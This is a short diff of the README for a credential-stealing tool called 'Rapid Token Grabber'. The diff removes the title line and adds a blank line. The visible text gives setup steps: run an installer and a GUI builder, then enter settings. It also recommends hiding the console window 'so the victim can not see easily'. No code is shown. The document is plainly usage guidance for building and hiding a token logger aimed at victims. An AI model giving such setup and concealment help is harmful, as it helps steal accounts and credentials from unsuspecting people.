@@ -1,4 +1,3 @@
-# Rapid-Token-Logger
 1. Run Install.bat (This will make it to where you can actually use it)
   - Pc may restart ( depends on computer )
 2. Once ran, run gui.exe
@@ -19,3 +18,4 @@
   then enter the information you want from their. I would suggest making it windows (hide the console) so the victim can not see easily
 
   You are done setting up Rapid Token Grabber.
+  
